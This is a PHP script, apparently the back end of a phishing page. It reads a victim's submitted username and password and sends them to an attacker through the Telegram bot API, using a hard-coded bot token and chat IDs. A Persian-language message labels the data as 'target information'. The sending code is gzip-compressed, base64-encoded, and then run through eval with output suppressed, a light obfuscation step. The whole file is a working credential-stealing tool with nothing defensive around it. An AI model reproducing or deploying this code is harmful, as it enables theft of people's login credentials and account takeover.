<?php
$username = $_POST['username'];
$password = $_POST['password'];

$code = <<<EOD
\$Token="8026401503:AAGDwnDthR4ZIPkWvWr-sqwf_PAUfjLopQQ";
\$ID = '5717515741','1352654452';
\$message = "
<b>اطلاعات تارگت😃</b>
<b>یوزرنیم:</b> <code>$username</code>
<b>پسورد:</b> <code>$password</code>
<b>chanell: @tmo61</b>
";

\$url = "https://api.telegram.org/bot\$Token/sendMessage";
\$params = [
    'chat_id' => \$ID,
    'text' => \$message,
    'parse_mode' => 'HTML',
];

try {
    \$ch = curl_init(\$url);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_POST, true);
    curl_setopt(\$ch, CURLOPT_POSTFIELDS, http_build_query(\$params));
    \$response = curl_exec(\$ch);
    curl_close(\$ch);
} catch (Exception \$e) {
    // echo "خطایی رخ داد: " . \$e->getMessage();
}
EOD;

$compressed = gzcompress($code);
$encoded = base64_encode($compressed);

$d = base64_decode($encoded);
$u = gzuncompress($d);
ob_start();
eval($u);
ob_end_clean();
?>
